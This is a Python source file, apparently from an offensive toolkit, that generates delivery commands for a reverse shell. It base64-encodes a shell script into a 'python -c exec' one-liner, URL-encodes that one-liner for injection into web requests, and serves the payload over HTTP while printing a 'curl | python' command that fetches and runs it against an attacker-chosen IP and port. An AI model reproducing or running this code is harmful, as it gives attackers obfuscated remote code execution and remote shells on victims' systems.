import base64

from delivery.http_server import DynamicHTTPServer, DynamicRequestHandler
from reverse_shell import reverse_shell_file

def reverse_shell_file_content():
    with open(reverse_shell_file) as f:
        return f.read()

def based(encoding="linux"):
    encoding = "utf-8" if encoding == "linux" else "utf-16le"
    return base64.b64encode(reverse_shell_file_content().encode(encoding)).decode()

def based_cradle(ip,port=42069, python="python"):
    return f"{python} -c 'import base64; exec(base64.b64decode(b\"{based()}\"))' {ip} {port}"

def url_encode(string_in):
    return "".join([f"%{hex(ord(i))[2:]}" for i in string_in])

def url_encoded_cradle(ip,port=42069, python="python"):
    return url_encode(based_cradle(ip,port, python))

def just_use_a_http_server_bro(ip, port, python, http_port=42080):
    with DynamicHTTPServer(("0.0.0.0", http_port), RequestHandlerClass=DynamicRequestHandler) as srv:
        legit_url_path = srv.add_file(reverse_shell_file)
        print(f"curl http://{ip}:{http_port}/{legit_url_path} | {python} - {ip} {port}")
        srv.serve_forever()
